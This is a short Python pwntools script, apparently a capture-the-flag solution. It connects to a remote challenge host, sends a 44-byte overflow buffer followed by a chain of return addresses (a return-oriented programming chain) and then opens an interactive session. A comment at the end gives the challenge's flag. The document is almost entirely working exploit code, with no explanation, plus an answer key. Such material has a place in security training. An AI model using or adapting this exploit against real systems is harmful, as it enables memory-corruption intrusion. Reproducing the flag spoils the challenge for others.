from pwn import *

p = remote("remote.goatskin.kr", 37373)
context_log_level = "debug"
payload = ""
for i in range(44) :
    payload += "A"
payload += p32(0x08048551)
payload += p32(0x08048640)
payload += p32(0x0804857e)
payload += p32(0x08048640)
payload += p32(0x080485af)
payload += "AAAA"
payload += p32(0x12345678)
p.sendline(payload)
p.interactive()

"""
answer = N0W_U_C4N_P3RF0RM_R0P!
"""
